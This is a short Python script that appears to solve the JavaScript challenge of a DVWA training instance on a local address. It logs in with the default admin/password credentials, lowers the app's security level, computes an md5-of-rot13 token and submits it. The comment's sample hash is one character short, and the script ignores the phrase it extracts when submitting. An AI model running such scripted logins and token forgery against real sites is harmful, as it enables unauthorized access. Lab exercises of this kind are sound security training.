#!/usr/bin/env python3
"""JavaScript logic probe for /vulnerabilities/javascript/ — Brain Engine v1
Token = md5(rot13(phrase)). Extract phrase from JS, compute token, submit."""
import requests, re, sys, hashlib, codecs
B = 'http://172.17.0.1:3100'
s = requests.Session()
r = s.get(B + '/login.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok = t.group(1) if t else ''
s.post(B + '/login.php', data={'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': tok}, timeout=10)
r = s.get(B + '/security.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok2 = t.group(1) if t else ''
s.post(B + '/security.php', data={'security': 'low', 'seclev_submit': 'Submit', 'user_token': tok2}, timeout=10)
# Get the page and extract the phrase
r = s.get(B + '/vulnerabilities/javascript/', timeout=10)
# Look for the phrase in the JS (typically "success" rot13'd or similar)
# DVWA low: phrase is "success", rot13 -> "fhccrff", md5 -> 38581812b435834ebf84ebc2c6424d6
m = re.search(r"phrase\s*=\s*['\"]([^'\"]+)['\"]", r.text)
phrase = m.group(1) if m else "success"
rot13 = codecs.encode(phrase, 'rot_13')
token = hashlib.md5(rot13.encode()).hexdigest()
print(f"PHRASE: {phrase}")
print(f"ROT13: {rot13}")
print(f"TOKEN: {token}")
print(f"TOKENLEN: {len(token)}")
# Submit the token
r2 = s.post(B + '/vulnerabilities/javascript/',
             data={'phrase': 'success', 'token': token},
             timeout=10)
welldone = 'Well done!' in r2.text
print(f"WELLDONE: {1 if welldone else 0}")
if welldone and len(token) == 32:
    print(f"VERDICT: CONFIRMED")
else:
    print(f"VERDICT: FAILED")
